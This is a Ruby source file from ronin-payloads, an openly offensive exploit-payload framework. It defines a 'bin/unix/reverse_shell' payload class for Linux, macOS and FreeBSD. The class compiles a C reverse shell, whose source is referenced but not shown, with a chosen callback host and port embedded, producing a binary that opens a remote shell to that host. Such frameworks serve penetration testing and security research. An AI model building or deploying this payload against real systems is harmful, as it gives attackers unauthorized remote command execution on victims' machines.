# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2026 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/c_payload'
require 'ronin/payloads/metadata/os'
require 'ronin/payloads/mixins/reverse_shell'
require 'ronin/payloads/mixins/tempfile'

module Ronin
  module Payloads
    module Bin
      module UNIX
        #
        # UNIX C reverse shell that executes "cmd".
        #
        class ReverseShell < CPayload

          include Metadata::OS
          include Mixins::ReverseShell
          include Mixins::Tempfile

          register 'bin/unix/reverse_shell'

          os :unix

          author "postmodern"

          summary 'UNIX C reverse shell'
          description <<~DESC
            UNIX reverse shell that executes "cmd" and is written in C.
          DESC

          references [
            "https://github.com/izenynn/c-reverse-shell#readme",
            "https://github.com/izenynn/c-reverse-shell/blob/main/linux.c"
          ]

          param :os, Enum[
                       :linux,
                       :macos,
                       :freebsd
                     ], desc: 'The target OS'

          # The path to the `reverse_shell.c` file.
          SOURCE_FILE = File.join(__dir__,'reverse_shell.c')

          #
          # Builds the shellcode.
          #
          def build
            tempfile('reverse_shell', ext: '.c') do |tempfile|
              compile(SOURCE_FILE, defs: {
                                     'CLIENT_IP'   => "\"#{params[:host]}\"",
                                     'CLIENT_PORT' => params[:port]
                                   },
                                   output: tempfile.path)

              @payload = File.binread(tempfile.path)
            end
          end

        end
      end
    end
  end
end
